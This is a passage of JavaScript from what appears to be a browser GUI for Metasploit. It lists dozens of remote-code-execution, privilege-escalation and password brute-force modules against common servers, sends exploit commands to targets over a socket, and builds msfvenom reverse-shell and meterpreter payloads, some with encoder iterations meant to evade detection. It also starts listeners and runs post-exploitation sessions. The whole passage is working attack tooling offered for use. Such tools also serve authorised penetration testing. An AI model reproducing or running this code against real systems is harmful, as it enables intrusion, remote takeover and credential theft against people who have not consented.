            'spring_cloud_rce': { path: 'exploit/multi/http/spring_cloud_gateway_rce', desc: 'Spring Cloud Gateway RCE', needPayload: true },
            'struts2_rest': { path: 'exploit/multi/http/struts2_rest_xstream', desc: 'Struts2 REST XStream RCE', needPayload: true },
            'struts2_showcase': { path: 'exploit/multi/http/struts2_showcase_ognl', desc: 'Struts2 Showcase OGNL RCE', needPayload: true },
            'weblogic_rce': { path: 'exploit/oracle/weblogic_t3_rce', desc: 'WebLogic T3åè®®RCE', needPayload: true },
            'weblogic_iiop': { path: 'exploit/oracle/weblogic_iiop_rce', desc: 'WebLogic IIOP RCE', needPayload: true },
            'weblogic_xml': { path: 'exploit/oracle/weblogic_xmldecoder_rce', desc: 'WebLogic XMLDecoder RCE', needPayload: true },
            'tomcat_mgr': { path: 'exploit/multi/http/tomcat_mgr_upload', desc: 'Tomcat Managerä¸Šä¼ RCE', needPayload: true },
            'tomcat_cve_2020': { path: 'exploit/multi/http/tomcat_ghostcat', desc: 'Tomcat CVE-2020-1938 Ghostcat', needPayload: true },
            'jboss_rce': { path: 'exploit/multi/http/jboss_invoker_deploy', desc: 'JBoss Invokeréƒ¨ç½²RCE', needPayload: true },
            'jenkins_rce': { path: 'exploit/multi/http/jenkins_cli_deserialize', desc: 'Jenkins CLIååºåˆ—åŒ–RCE', needPayload: true },
            'jenkins_script': { path: 'exploit/multi/http/jenkins_script_console', desc: 'Jenkinsè„šæœ¬æ§åˆ¶å°RCE', needPayload: true },
            'apache_flink': { path: 'exploit/multi/http/apache_flink_rce', desc: 'Apache Flink RCE', needPayload: true },
            'apache_druid': { path: 'exploit/multi/http/apache_druid_rce', desc: 'Apache Druid RCE', needPayload: true },
            'fastjson_rce': { path: 'exploit/multi/http/fastjson_rce', desc: 'FastJSONååºåˆ—åŒ–RCE', needPayload: true },
            'shiro_rce': { path: 'exploit/multi/http/shiro_rememberme_vuln', desc: 'Shiro RememberMeååºåˆ—åŒ–', needPayload: true },

            // å…¶ä»– Web æ¼æ´
            'apache_cve_2021': { path: 'exploit/multi/http/apache_path_traversal', desc: 'Apache CVE-2021-41773 è·¯å¾„ç©¿è¶Š', needPayload: true },
            'nginx_rce': { path: 'exploit/multi/http/nginx_config_error', desc: 'Nginxé…ç½®é”™è¯¯åˆ©ç”¨', needPayload: true },
            'iis_rce': { path: 'exploit/windows/iis/iis_webdav_rce', desc: 'IIS WebDAV RCE', needPayload: true },
            'wordpress_rce': { path: 'exploit/unix/webapp/wordpress_xmlrpc_rce', desc: 'WordPress XML-RPC RCE', needPayload: true },
            'drupal_rce': { path: 'exploit/unix/webapp/drupal_drupalgeddon2', desc: 'Drupalgeddon2 RCE', needPayload: true },
            'joomla_rce': { path: 'exploit/unix/webapp/joomla_rce', desc: 'Joomla RCE', needPayload: true },
            'cve_2021_26084': { path: 'exploit/multi/http/confluence_ognl_rce', desc: 'Confluence OGNL RCE 2021', needPayload: true },
            'cve_2022_26134': { path: 'exploit/multi/http/confluence_ognl_rce_2022', desc: 'Confluence OGNL RCE 2022', needPayload: true },
            'gitlab_rce': { path: 'exploit/multi/http/gitlab_exiftool_rce', desc: 'GitLab ExifTool RCE', needPayload: true },
            'cacti_rce': { path: 'exploit/unix/webapp/cacti_rce', desc: 'Cacti RCE', needPayload: true },
            'zabbix_rce': { path: 'exploit/unix/webapp/zabbix_server_rce', desc: 'Zabbix Server RCE', needPayload: true },
            'elastic_rce': { path: 'exploit/multi/http/elasticsearch_rce', desc: 'Elasticsearch RCE', needPayload: true },
            'mongo_rce': { path: 'exploit/multi/http/mongodb_unauth', desc: 'MongoDBæœªæˆæƒè®¿é—®', needPayload: false },

            // æ•°æ®åº“æ¼æ´
            'mysql_auth': { path: 'auxiliary/scanner/mysql/mysql_login', desc: 'MySQLå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'mysql_udf': { path: 'exploit/multi/mysql/mysql_udf_payload', desc: 'MySQL UDFææƒ', needPayload: true },
            'mssql_auth': { path: 'auxiliary/scanner/mssql/mssql_login', desc: 'MSSQLå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'mssql_rce': { path: 'exploit/windows/mssql/mssql_payload', desc: 'MSSQL xp_cmdshell RCE', needPayload: true },
            'oracle_login': { path: 'auxiliary/scanner/oracle/oracle_login', desc: 'Oracleå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'postgres_auth': { path: 'auxiliary/scanner/postgres/postgres_login', desc: 'PostgreSQLå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'postgres_rce': { path: 'exploit/linux/postgres/postgres_payload', desc: 'PostgreSQL RCE', needPayload: true },
            'redis_unauth': { path: 'auxiliary/scanner/redis/redis_server', desc: 'Redisæœªæˆæƒè®¿é—®', needPayload: false },
            'redis_rce': { path: 'exploit/linux/redis/redis_replication_rce', desc: 'Redisä¸»ä»å¤åˆ¶RCE', needPayload: true },
            'memcached_unauth': { path: 'auxiliary/scanner/memcached/memcached_amp', desc: 'Memcachedæœªæˆæƒ', needPayload: false },

            // æœåŠ¡æ¼æ´
            'ssh_login': { path: 'auxiliary/scanner/ssh/ssh_login', desc: 'SSHå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'ssh_libssh': { path: 'exploit/linux/ssh/libssh_auth_bypass', desc: 'LibSSHè®¤è¯ç»•è¿‡RCE', needPayload: true },
            'ftp_login': { path: 'auxiliary/scanner/ftp/ftp_login', desc: 'FTPå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'vsftpd_rce': { path: 'exploit/unix/ftp/vsftpd_234_backdoor', desc: 'VSFTPD 2.3.4åé—¨', needPayload: true },
            'proftpd_rce': { path: 'exploit/unix/ftp/proftpd_rce', desc: 'ProFTPD RCE', needPayload: true },
            'smb_version': { path: 'auxiliary/scanner/smb/smb_version', desc: 'SMBç‰ˆæœ¬æ¢æµ‹', needPayload: false },
            'smb_login': { path: 'auxiliary/scanner/smb/smb_login', desc: 'SMBå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'samba_symlink': { path: 'exploit/linux/samba/samba_symlink_traversal', desc: 'Sambaç¬¦å·é“¾æ¥RCE', needPayload: true },
            'samba_is_known': { path: 'exploit/linux/samba/is_known_pipename', desc: 'Samba is_known_pipename', needPayload: true },
            'rdp_rce': { path: 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce', desc: 'RDP BlueKeep RCE', needPayload: true },
            'vnc_auth': { path: 'auxiliary/scanner/vnc/vnc_auth', desc: 'VNCå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'telnet_login': { path: 'auxiliary/scanner/telnet/telnet_login', desc: 'Telnetå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'smtp_login': { path: 'auxiliary/scanner/smtp/smtp_login', desc: 'SMTPå¼±å£ä»¤çˆ†ç ´', needPayload: false },
            'ldap_login': { path: 'auxiliary/scanner/ldap/ldap_login', desc: 'LDAPå¼±å£ä»¤çˆ†ç ´', needPayload: false },

            // Linux ææƒ
            'linux_dirty_cow': { path: 'exploit/linux/local/dirty_cow', desc: 'DirtyCow CVE-2016-5195', needPayload: true },
            'linux_dirty_pipe': { path: 'exploit/linux/local/dirty_pipe', desc: 'DirtyPipe CVE-2022-0847', needPayload: true },
            'linux_pwnkit': { path: 'exploit/linux/local/pwnkit', desc: 'PwnKit CVE-2021-4034', needPayload: true },
            'linux_cve_2021_3156': { path: 'exploit/linux/local/sudo_baron_samedit', desc: 'Sudo Baronic CVE-2021-3156', needPayload: true },
            'linux_cve_2021_3560': { path: 'exploit/linux/local/polkit_pkexec', desc: 'Polkit pkexec CVE-2021-3560', needPayload: true },

            // Windows ææƒ
            'win_printnightmare': { path: 'exploit/windows/dcerpc/cve_2021_34527_printnightmare', desc: 'PrintNightmare CVE-2021-34527', needPayload: true },
            'win_printspooler': { path: 'exploit/windows/dcerpc/printspooler_rce', desc: 'PrintSpooler RCE', needPayload: true },
            'win_cve_2021_36934': { path: 'exploit/windows/local/hivenightmare', desc: 'HiveNightmare CVE-2021-36934', needPayload: true },
            'win_cve_2021_1675': { path: 'exploit/windows/local/printnightmare_lpe', desc: 'PrintNightmare LPE', needPayload: true },
            'win_noauth': { path: 'exploit/windows/dcerpc/cve_2020_1472_zerologon', desc: 'Zerologon CVE-2020-1472', needPayload: true },
            'win_petitpotam': { path: 'exploit/windows/dcerpc/petitpotam', desc: 'PetitPotam LSA Spoofing', needPayload: true },

            // æ‰«æä¸æ¢æµ‹
            'portscan': { path: 'auxiliary/scanner/portscan/tcp', desc: 'TCPç«¯å£æ‰«æ', needPayload: false },
            'udp_scan': { path: 'auxiliary/scanner/portscan/udp', desc: 'UDPç«¯å£æ‰«æ', needPayload: false },
            'http_dir': { path: 'auxiliary/scanner/http/dir_scanner', desc: 'HTTPç›®å½•æ‰«æ', needPayload: false },
            'http_enum': { path: 'auxiliary/scanner/http/http_enum', desc: 'HTTPæšä¸¾', needPayload: false },
            'dns_enum': { path: 'auxiliary/scanner/dns/dns_enum', desc: 'DNSæšä¸¾', needPayload: false },
            'snmp_enum': { path: 'auxiliary/scanner/snmp/snmp_enum', desc: 'SNMPæšä¸¾', needPayload: false },
            'ntp_enum': { path: 'auxiliary/scanner/ntp/ntp_enum', desc: 'NTPæšä¸¾', needPayload: false },
            'fingerprint': { path: 'auxiliary/scanner/http/http_fingerprint', desc: 'HTTPæŒ‡çº¹è¯†åˆ«', needPayload: false },

            // ç›‘å¬å™¨
            'handler': { path: 'exploit/multi/handler', desc: 'é€šç”¨Payloadç›‘å¬å™¨', needPayload: true },
            'handler_https': { path: 'exploit/multi/handler', desc: 'HTTPS Payloadç›‘å¬å™¨', needPayload: true },
            'handler_bind': { path: 'exploit/multi/handler', desc: 'Bind Shellç›‘å¬å™¨', needPayload: true }
        };

        window.onload = function() {
            document.getElementById('lhost').value = window.location.hostname;
            document.getElementById('genLhost').value = window.location.hostname;
            document.getElementById('handlerLhost').value = window.location.hostname;
            loadModuleConfig();
        };

        function switchPanel(panelName) {
            document.querySelectorAll('.panel-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.panel-content').forEach(p => p.classList.add('hidden'));
            document.getElementById('tab-' + panelName).classList.add('active');
            document.getElementById('panel-' + panelName).classList.remove('hidden');
            if (panelName === 'downloads') refreshPayloadFiles();
        }

        function showTab(tabName) {
            document.getElementById('tab-sessions').classList.add('hidden');
            document.getElementById('tab-jobs').classList.add('hidden');
            document.getElementById('btn-sessions').classList.remove('text-white', 'border-b-2', 'border-red-500');
            document.getElementById('btn-sessions').classList.add('text-slate-400');
            document.getElementById('btn-jobs').classList.remove('text-white', 'border-b-2', 'border-red-500');
            document.getElementById('btn-jobs').classList.add('text-slate-400');

            document.getElementById('tab-' + tabName).classList.remove('hidden');
            document.getElementById('btn-' + tabName).classList.add('text-white', 'border-b-2', 'border-red-500');
            document.getElementById('btn-' + tabName).classList.remove('text-slate-400');

            if (tabName === 'sessions') refreshSessions();
            else refreshJobs();
        }

        function loadModuleConfig() {
            const key = document.getElementById('moduleSelect').value;
            const conf = modules[key];
            document.getElementById('moduleDesc').innerText = conf.desc;
            document.getElementById('payloadGroup').classList.toggle('hidden', !conf.needPayload);
        }

        function runModule() {
            const key = document.getElementById('moduleSelect').value;
            const conf = modules[key];
            const rhost = document.getElementById('rhosts').value;
            const lhost = document.getElementById('lhost').value;
            const lport = document.getElementById('lport').value;
            const payload = document.getElementById('payload').value;

            if (!rhost && key !== 'handler') { alert("è¯·è¾“å…¥ç›®æ ‡ RHOSTSï¼"); return; }

            const commands = [`use ${conf.path}`];
            if (rhost) commands.push(`set RHOSTS ${rhost}`);
            if (conf.needPayload) {
                commands.push(`set PAYLOAD ${payload}`);
                commands.push(`set LHOST ${lhost}`);
                commands.push(`set LPORT ${lport}`);
            }
            commands.push('set VERBOSE true');
            commands.push('run -j');

            commands.forEach(cmd => socket.emit('msf-input', cmd));
            logOutput(`\n[GUI] æ­£åœ¨åå°æ‰§è¡Œ: ${conf.path}\n`);
            setTimeout(refreshJobs, 3000);
        }

        function generatePayload() {
            const payload = document.getElementById('genPayload').value;
            const lhost = document.getElementById('genLhost').value;
            const lport = document.getElementById('genLport').value || '4444';
            const format = document.getElementById('genFormat').value;
            const encoder = document.getElementById('genEncoder').value;
            const filename = `payload_${Date.now().toString(36)}.${format}`;

            if (!lhost) { alert("è¯·è¾“å…¥ LHOSTï¼"); return; }

            let cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport}`;
            if (encoder) {
                cmd += ` -e ${encoder}`;
            }
            cmd += ` -f ${format} -o /tmp/${filename}`;

            quickCmd(cmd);
            logOutput(`\n[GUI] ç”Ÿæˆä¸­... /tmp/${filename}\n`);
            setTimeout(refreshPayloadFiles, 3000);
        }

        function startHandler() {
            const lhost = document.getElementById('handlerLhost').value;
            const lport = document.getElementById('handlerLport').value;
            if (!lhost) { alert("è¯·è¾“å…¥ LHOSTï¼"); return; }

            ['use exploit/multi/handler', 'set PAYLOAD windows/x64/meterpreter/reverse_tcp', `set LHOST ${lhost}`, `set LPORT ${lport}`, 'run -j']
            .forEach(cmd => socket.emit('msf-input', cmd));
            logOutput(`\n[GUI] ç›‘å¬å™¨å·²å¯åŠ¨: ${lhost}:${lport}\n`);
            setTimeout(refreshJobs, 2000);
        }

        function presetHandler(port, payload) {
            document.getElementById('handlerLport').value = port;
            startHandler();
        }

        function quickCmd(cmd) {
            socket.emit('msf-input', cmd);
            logOutput(`\nmsf6 > ${cmd}\n`);
        }

        // === ä¼šè¯ä¾§è¾¹æ åŠŸèƒ½ ===

        function toggleSidebar(forceOpen) {
            const sidebar = document.getElementById('sessionSidebar');
            // å¦‚æœä¼ å…¥å‚æ•°ï¼Œåˆ™å¼ºåˆ¶è®¾ç½®çŠ¶æ€ï¼›å¦åˆ™åˆ‡æ¢çŠ¶æ€
            if (typeof forceOpen === 'boolean') {
                sidebarOpen = forceOpen;
            } else {
                sidebarOpen = !sidebarOpen;
            }

            if (sidebarOpen) {
                sidebar.classList.remove('sidebar-collapsed');
            } else {
                sidebar.classList.add('sidebar-collapsed');
            }
        }

        function selectSession(id, os) {
            currentSessionId = String(id);
            currentSessionOs = os;
            toggleSidebar(true);

            document.getElementById('sidebarTitle').textContent = `ä¼šè¯ #${id}`;
            document.getElementById('sidebarSubtitle').textContent = os === 'windows' ? 'Windows' : os === 'linux' ? 'Linux' : 'Unknown';

            // æ˜¾ç¤º/éšè—æ“ä½œé¢æ¿
            document.getElementById('noSessionHint').classList.add('hidden');
            document.getElementById('windowsActions').classList.toggle('hidden', os !== 'windows');
            document.getElementById('linuxActions').classList.toggle('hidden', os !== 'linux');
            document.getElementById('commonActions').classList.remove('hidden');
            document.getElementById('sessionInfo').classList.remove('hidden');

            // æ›´æ–°å›¾æ ‡
            document.getElementById('sidebarOsIcon').textContent = os === 'windows' ? 'ğŸªŸ' : os === 'linux' ? 'ğŸ§' : 'ğŸ’»';

            // è·å–ç³»ç»Ÿä¿¡æ¯
            refreshSysInfo();

            // å¦‚æœOSæœªçŸ¥ï¼Œé»˜è®¤æ˜¾ç¤ºä¸€äº›å¸¸ç”¨æ“ä½œ
            if (os === 'unknown') {
                // å¯¹äºæœªçŸ¥ç³»ç»Ÿï¼Œä»ç„¶æ˜¾ç¤ºWindowsé¢æ¿ä½œä¸ºé»˜è®¤ï¼ˆç”¨æˆ·å¯æ‰‹åŠ¨åˆ‡æ¢ï¼‰
                document.getElementById('windowsActions').classList.remove('hidden');
            }
        }

        function refreshSysInfo() {
            if (!currentSessionId) return;
            sessionCmd('sysinfo');
        }

        function sessionCmd(cmd, forceDirect = false) {
            if (!currentSessionId) {
                alert('è¯·å…ˆé€‰æ‹©ä¸€ä¸ªä¼šè¯');
                return;
            }

            // å¦‚æœå·²ç»åœ¨ä¼šè¯æ¨¡å¼ä¸­ï¼Œç›´æ¥å‘é€å‘½ä»¤
            if (inSessionMode || forceDirect) {
                socket.emit('msf-input', cmd);
                logOutput(`\n[meterpreter] > ${cmd}\n`);
            } else {
                // ä¸åœ¨ä¼šè¯æ¨¡å¼ï¼Œå…ˆè¿›å…¥ä¼šè¯å†å‘é€å‘½ä»¤
                socket.emit('msf-input', `sessions -i ${currentSessionId}`);
                inSessionMode = true;
                setTimeout(() => {
                    socket.emit('msf-input', cmd);
                }, 200);
                logOutput(`\n[GUI] è¿›å…¥ä¼šè¯ ${currentSessionId}\n[meterpreter] > ${cmd}\n`);
            }
        }

        // è¿›å…¥ä¼šè¯äº¤äº’æ¨¡å¼
        function enterSessionMode() {
            if (!currentSessionId) {
                alert('è¯·å…ˆé€‰æ‹©ä¸€ä¸ªä¼šè¯');
                return;
            }
            socket.emit('msf-input', `sessions -i ${currentSessionId}`);
            inSessionMode = true;
            logOutput(`\n[GUI] å·²è¿›å…¥ä¼šè¯ ${currentSessionId} äº¤äº’æ¨¡å¼\n`);
        }

        // é€€å‡ºä¼šè¯ï¼ˆåå°è¿è¡Œï¼‰
        function backgroundSession() {
            socket.emit('msf-input', 'background');
            inSessionMode = false;
            logOutput(`\n[GUI] ä¼šè¯å·²è½¬å…¥åå°\n`);
        }

        function killCurrentSession() {
            if (!currentSessionId) return;
            if (confirm(`ç¡®å®šå…³é—­ä¼šè¯ ${currentSessionId}?`)) {
                quickCmd(`sessions -k ${currentSessionId}`);
                currentSessionId = null;
                inSessionMode = false;
                toggleSidebar(false);
                setTimeout(refreshSessions, 1000);
            }
        }

        function quickGeneratePayload(type, ext) {
            const lhost = document.getElementById('genLhost').value || window.location.hostname;
            const filename = `payload_${Date.now().toString(36)}.${ext}`;

            let payload, cmd;
            switch(type) {
                case 'windows':
                    payload = 'windows/x64/meterpreter/reverse_tcp';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
                    break;
                case 'linux':
                    payload = 'linux/x64/meterpreter/reverse_tcp';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
                    break;
                case 'php':
                    payload = 'php/meterpreter/reverse_tcp';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f raw > /tmp/${filename}`;
                    break;
                case 'jsp':
                    payload = 'java/jsp_shell_reverse_tcp';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
                    break;
                case 'python':
                    payload = 'python/meterpreter/reverse_tcp';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
                    break;
                case 'bash':
                    payload = 'cmd/unix/reverse_bash';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} > /tmp/${filename}`;
                    break;
                case 'powershell':
                    payload = 'windows/x64/powershell/reverse_tcp';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
                    break;
                case 'dll':
                    payload = 'windows/x64/meterpreter/reverse_tcp';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
                    break;
                case 'war':
                    payload = 'java/jsp_shell_reverse_tcp';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
                    break;
                case 'aspx':
                    payload = 'windows/meterpreter/reverse_tcp';
                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
                    break;
            }

            quickCmd(cmd);
            logOutput(`\n[GUI] ç”Ÿæˆä¸­... /tmp/${filename}\n`);
            setTimeout(refreshPayloadFiles, 3000);
        }

        function generateEncodedPayload(type, ext, encoder, iterations = 1) {
            const lhost = document.getElementById('genLhost').value || window.location.hostname;
            const filename = `payload_encoded_${Date.now().toString(36)}.${ext}`;

            let payload;
            switch(type) {
                case 'windows':
                    payload = 'windows/x64/meterpreter/reverse_tcp';
                    break;
                case 'linux':
                    payload = 'linux/x64/meterpreter/reverse_tcp';
                    break;
                default:
                    payload = 'windows/x64/meterpreter/reverse_tcp';
            }

            let cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -e ${encoder}`;
            if (iterations > 1) {
                cmd += ` -i ${iterations}`;
            }
            cmd += ` -f ${ext} -o /tmp/${filename}`;

            quickCmd(cmd);
            logOutput(`\n[GUI] ç¼–ç ç”Ÿæˆä¸­ (ç¼–ç å™¨: ${encoder}, è¿­ä»£: ${iterations}æ¬¡)... /tmp/${filename}\n`);
            setTimeout(refreshPayloadFiles, 5000);
        }

        function refreshPayloadFiles() {
            const listEl = document.getElementById('payloadFilesList');
            listEl.innerHTML = '<div class="text-center text-slate-500 text-[9px] py-2 animate-pulse">åŠ è½½ä¸­...</div>';

            fetch('/api/payloads')
                .then(res => res.json())
                .then(data => {
                    if (data.success && data.files.length > 0) {
                        listEl.innerHTML = data.files.slice(0, 10).map(f => `
                            <div class="bg-slate-900 rounded p-1.5 flex items-center justify-between">
                                <div class="flex-1 min-w-0 mr-1">
                                    <div class="text-[9px] text-slate-300 truncate">${f.name}</div>
                                    <div class="text-[8px] text-slate-600">${f.size}</div>
                                </div>
                                <a href="/api/payloads/download/${encodeURIComponent(f.name)}" class="text-[9px] bg-blue-600 hover:bg-blue-500 text-white px-1.5 py-0.5 rounded" download>ä¸‹è½½</a>
                            </div>
                        `).join('');
                    } else {
                        listEl.innerHTML = '<div class="text-center text-slate-600 text-[9px] py-2">æš‚æ— æ–‡ä»¶</div>';
                    }
                });
        }

        function refreshSessions() {
            if (isRefreshing) {
                console.log('[DEBUG] Already refreshing, skipping...');
                return;
            }
            isRefreshing = true;
            refreshType = 'sessions';
            buffer = "";
            console.log('[DEBUG] Sending sessions -l command');
            socket.emit('msf-input', 'sessions -l');
            // è®¾ç½®è¶…æ—¶ï¼Œé˜²æ­¢å¡ä½
            setTimeout(() => {
                if (isRefreshing && refreshType === 'sessions') {
                    console.log('[DEBUG] Session refresh timeout, parsing anyway');
                    isRefreshing = false;
                    parseSessions(buffer);
                }
            }, 5000);
        }

        function refreshJobs() {
            if (isRefreshing) return;
            isRefreshing = true;
            refreshType = 'jobs';
            buffer = "";
            socket.emit('msf-input', 'jobs -l');
            setTimeout(() => {
                if (isRefreshing && refreshType === 'jobs') {
                    isRefreshing = false;
                    parseJobs(buffer);
                }
            }, 5000);
        }

        function parseSessions(text) {
            const tbody = document.getElementById('sessionsList');
            tbody.innerHTML = "";
            sessions = {};

            // æ¸…ç† ANSI ä»£ç å’Œç‰¹æ®Šå­—ç¬¦
            text = text.replace(/\x1b\[[0-9;]*[mK]/g, '').replace(/\[\d+m/g, '');

            const lines = text.split('\n');
            let found = false;

            // è°ƒè¯•ï¼šåœ¨æ§åˆ¶å°æ˜¾ç¤ºè§£æå†…å®¹
            console.log('[DEBUG] Parsing sessions, total chars:', text.length, 'lines:', lines.length);
            console.log('[DEBUG] First 300 chars:', text.substring(0, 300));

            // æ£€æŸ¥æ˜¯å¦æ˜¾ç¤º"æ²¡æœ‰æ´»è·ƒä¼šè¯"çš„æ¶ˆæ¯
            if (text.toLowerCase().includes('no active sessions') || text.includes('æ²¡æœ‰æ´»è·ƒä¼šè¯')) {
                tbody.innerHTML = '<tr><td colspan="5" class="p-2 text-center text-slate-600">æš‚æ— ä¼šè¯</td></tr>';
                sessionCountEl.classList.add('hidden');
                return;
            }

            lines.forEach((line, index) => {
                // æ¸…ç†è¡Œå†…å®¹
                const cleanLine = line.trim();

                // è·³è¿‡è¡¨å¤´è¡Œ
                if (cleanLine.startsWith('Id') || cleanLine.startsWith('--') || cleanLine.includes('===')) {
                    return;
                }

                // å¤šç§åŒ¹é…æ¨¡å¼
                // æ¨¡å¼1: "1  meterpreter x86/windows  ..."
                // æ¨¡å¼2: "  1       meterpreter ..."
                // æ¨¡å¼3: æ•°å­—å¼€å¤´ï¼Œåè·Ÿç©ºæ ¼å’Œç±»å‹
                let match = null;

                // å°è¯•ä¸åŒçš„æ­£åˆ™æ¨¡å¼
                const patterns = [
                    /^(\d+)\s+(meterpreter|shell)/i,
                    /^\s*(\d+)\s+(meterpreter|shell)/i,
                    /^(\d+)\s+\S+\s+(meterpreter|shell)/i
                ];

                for (const pattern of patterns) {
                    match = line.match(pattern);
                    if (match) break;
                }

                if (match) {
                    found = true;
                    const id = match[1];
                    const type = match[2].toLowerCase();

                    // æ£€æµ‹æ“ä½œç³»ç»Ÿ - ä»æ•´è¡Œå†…å®¹åˆ¤æ–­
                    let os = 'unknown';
                    const lowerLine = line.toLowerCase();
                    if (lowerLine.includes('windows') || lowerLine.includes('win') ||
                        lowerLine.includes('x86/windows') || lowerLine.includes('x64/windows') ||
                        lowerLine.includes('x64\\windows') || lowerLine.includes('x86\\windows')) {
                        os = 'windows';
                    } else if (lowerLine.includes('linux') || lowerLine.includes('ubuntu') ||
                               lowerLine.includes('debian') || lowerLine.includes('centos') ||
                               lowerLine.includes('x86/linux') || lowerLine.includes('x64/linux')) {
                        os = 'linux';
                    }

                    // æå–IPåœ°å€
                    let target = '-';
                    const ipMatches = line.match(/(\d+\.\d+\.\d+\.\d+)/g);
                    if (ipMatches && ipMatches.length > 0) {
                        // é€šå¸¸æœ€åä¸€ä¸ªIPæ˜¯ç›®æ ‡æœºå™¨çš„IP
                        target = ipMatches[ipMatches.length - 1];
                    }

                    // æå–ç”¨æˆ·å
                    let user = '-';
                    const winUser = line.match(/\\(\w+)/);
                    const linuxUser = line.match(/(\w+)\s+@/);
                    if (winUser) user = winUser[1];
                    else if (linuxUser) user = linuxUser[1];

                    sessions[id] = { id, type, os, target, user };
                    console.log(`[DEBUG] Found session: ID=${id}, OS=${os}, Type=${type}, Target=${target}`);

                    const osIcon = os === 'windows' ? 'ğŸªŸ' : os === 'linux' ? 'ğŸ§' : 'ğŸ’»';
                    const osClass = os === 'windows' ? 'os-windows' : os === 'linux' ? 'os-linux' : 'os-unknown';
                    const typeDisplay = type.includes('meterpreter') ? 'meter' : 'shell';
                    const typeClass = type.includes('meterpreter') ? 'bg-green-900/50 text-green-300' : 'bg-blue-900/50 text-blue-300';

                    const row = document.createElement('tr');
                    row.className = 'session-row border-b border-slate-800 cursor-pointer hover:bg-slate-800/50';
                    row.onclick = () => selectSession(id, os);
                    row.innerHTML = `
                        <td class="p-1.5 text-green-400 font-bold">${id}</td>
                        <td class="p-1.5"><span class="px-1 py-0.5 rounded text-[8px] ${typeClass}">${typeDisplay}</span></td>
                        <td class="p-1.5 font-mono text-[9px]">${target}</td>
                        <td class="p-1.5 ${osClass} text-[9px]">${osIcon}</td>
                        <td class="p-1.5">
                            <button onclick="event.stopPropagation(); interactSession('${id}')" class="text-[8px] bg-blue-900/50 hover:bg-blue-700 text-blue-300 px-1 py-0.5 rounded mr-0.5">äº¤äº’</button>
                            <button onclick="event.stopPropagation(); killSessionById('${id}')" class="text-[8px] bg-red-900/50 hover:bg-red-700 text-red-300 px-1 py-0.5 rounded">å…³é—­</button>
                        </td>
                    `;
                    tbody.appendChild(row);
                }
            });

            if (!found) {
                console.log('[DEBUG] No sessions found in output');
                tbody.innerHTML = '<tr><td colspan="5" class="p-2 text-center text-slate-600">æš‚æ— ä¼šè¯</td></tr>';
            }

            // æ›´æ–°ä¼šè¯è®¡æ•°
            const count = Object.keys(sessions).length;
            if (count > 0) {
                sessionCountEl.textContent = `${count} Session${count > 1 ? 's' : ''}`;
                sessionCountEl.classList.remove('hidden');
            } else {
                sessionCountEl.classList.add('hidden');
            }
        }

        function parseJobs(text) {
            const tbody = document.getElementById('jobsList');
            tbody.innerHTML = "";

            // æ¸…ç† ANSI ä»£ç 
            text = text.replace(/\x1b\[[0-9;]*[mK]/g, '').replace(/\[\d+m/g, '');

            const lines = text.split('\n');
            let found = false;

            console.log('[DEBUG] Parsing jobs, lines:', lines.length);

            lines.forEach((line, index) => {
                // åŒ¹é…ä»»åŠ¡è¡Œï¼šID + æ¨¡å—è·¯å¾„
                const match = line.match(/^\s*(\d+)\s+(.+)/);
                if (match && line.includes('/') && !line.toLowerCase().includes('job id') && !line.includes('---')) {
                    found = true;
                    const id = match[1];
                    const rest = match[2].trim();
                    const parts = rest.split(/\s+/);
                    let module = parts[0] ? parts[0].replace('Exploit:', '').replace('Auxiliary:', '') : rest;

                    console.log(`[DEBUG] Found job: ID=${id}, Module=${module}`);

                    const row = document.createElement('tr');
                    row.className = 'border-b border-slate-800 hover:bg-slate-800/50 cursor-pointer';
                    row.onclick = () => interactJob(id, module);
                    row.innerHTML = `
                        <td class="p-1.5 text-blue-400 font-bold">${id}</td>
                        <td class="p-1.5 font-mono text-[9px] truncate max-w-[150px]">${module}</td>
                        <td class="p-1.5">
                            <button onclick="event.stopPropagation(); killJob('${id}')" class="text-[8px] bg-red-900/50 hover:bg-red-600 text-white px-1.5 py-0.5 rounded">åœæ­¢</button>
                        </td>
                    `;
                    tbody.appendChild(row);
                }
            });

            if (!found) {
                tbody.innerHTML = '<tr><td colspan="3" class="p-2 text-center text-slate-600">æš‚æ— ä»»åŠ¡</td></tr>';
            }
        }

        function interactJob(id, module) {
            // ç‚¹å‡»ä»»åŠ¡è¡Œæ—¶æ˜¾ç¤ºä»»åŠ¡ä¿¡æ¯
            logOutput(`\n[GUI] ä»»åŠ¡ #${id}: ${module}\n`);
            quickCmd(`jobs -i ${id}`);
        }

        function interactSession(id) {
            currentSessionId = String(id);
            // å…ˆä»ä¼šè¯æ•°æ®ä¸­è·å–OSä¿¡æ¯
            if (sessions[id] && sessions[id].os) {
                currentSessionOs = sessions[id].os;
            }
            quickCmd(`sessions -i ${id}`);
            logOutput(`\n[GUI] å·²è¿æ¥ä¼šè¯ ${id}\n`);
